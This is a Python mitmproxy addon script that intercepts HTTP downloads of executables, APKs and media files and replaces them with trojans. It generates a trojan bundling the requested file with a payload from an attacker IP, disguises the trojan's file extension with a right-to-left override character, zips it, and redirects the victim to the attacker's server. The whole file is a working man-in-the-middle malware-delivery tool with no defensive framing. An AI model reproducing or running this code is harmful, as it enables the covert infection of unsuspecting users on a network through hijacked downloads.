import mitmproxy.http
import subprocess
import os
from Trojan import *

IP = "192.168.126.215"
TARGET_TEXTENSIONS = [".exe", ".apk", ".mp4", ".mp3"]
EVIL_FILE = "http://192.168.126.215/sample.exe"
WEB_ROOT = "/var/www/html/"
SPOOF_EXTENSION = True

def request(flow: mitmproxy.http.HTTPFlow) -> None:    
    if flow.request.host != IP and flow.request.pretty_url.endswith(tuple(TARGET_TEXTENSIONS)):        
        front_file_name = flow.request.pretty_url.split("/")[-1].split(".")[0]
        front_file = flow.request.pretty_url + "#"
        download_file_name = front_file_name + ".exe"
        trojan_file = os.path.join(WEB_ROOT, download_file_name)
        
        print(f"[+] Generating a trojan for {flow.request.pretty_url}")
        
        mitm = True
        trojan = Trojan(front_file, EVIL_FILE, None, trojan_file, IP)
        trojan.create(mitm)
        trojan.compile()

        if SPOOF_EXTENSION: 
            front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
            if front_file_extension != "exe":
                new_name = front_file_name + "‮" + front_file_extension[::-1] + ".exe"
                spoofed_file = os.path.join(WEB_ROOT, new_name)
                os.rename(trojan_file, spoofed_file)      
                trojan.zip(spoofed_file)
                download_file_name = front_file_name + ".zip"
        
        torjan_download_url = f"http://{IP}/{download_file_name}"
        
        flow.response = mitmproxy.http.Response.make(
            301, 
            b"", 
            {"Location": torjan_download_url}
        )
